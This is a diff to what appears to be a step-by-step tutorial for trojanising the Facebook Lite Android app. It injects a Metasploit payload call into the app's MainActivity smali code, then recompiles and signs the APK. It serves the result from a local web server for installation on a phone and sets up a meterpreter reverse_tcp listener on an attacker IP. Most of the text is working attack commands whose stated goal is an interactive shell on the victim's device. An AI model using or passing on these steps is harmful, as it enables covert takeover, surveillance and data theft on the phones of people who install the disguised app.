@@ -101,9 +101,7 @@ We need to look for the Main Activity that is going to be launched when the appl
 Where you find a target activity or a path for example com.facebook.lite.MainActivity
 We have to open the smali folder of the original apk directory and follow the above path for MainActivity file
 Here we need to find the onCreate function in which we will find an Landroid function under that add the below line
-
-invoke-static {p0}, Lcom/metasploit/stage/Payload;->onCreate(Landroid/content/Context;)V 
-
+=> invoke-static {p0}, Lcom/metasploit/stage/Payload;->onCreate(Landroid/content/Context;)V 
 Now add some of the permissions from payload apk manifest file to original apk manifest file and save all the files
 Recompile the apk
 > cd /root/Desktop/
@@ -112,3 +110,20 @@ We can find recompiled application in
 > cd original
 > cd dist
 > ls (you will find recompiled application here, fb.apk which is not signed)
+Generate keystore to sign the apk
+> keytool -genkey -V -keystore test.keystore -alias test -keyalg RSA -keysize 2048 -validity 1000
+Secure password and fill the necessary details
+Sign apk with the keystore
+> jarsigner -verbose -sigalg SHA1withRSA -digestalg ShA1 -keystore test.keystore fb.apk test
+Zipalign apk
+> zipalign -v 4 fb.apk fbSigned.apk
+> rm -rf fb.apk test.keystore
+> python3 -m http.server (now open chrome in your android phone & search attack_machine_ip:port and install the apk)
+open another terminal
+> msfconsole
+> msf6 use multi/handler
+> msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
+> msf6 exploit(multi/handler) > set LHOST attack_machine_ip
+> msf6 exploit(multi/handler) > set LPORT 4444
+> msf6 exploit(multi/handler) > exploit
+open the apk app on the phone to recieve the interactive shell
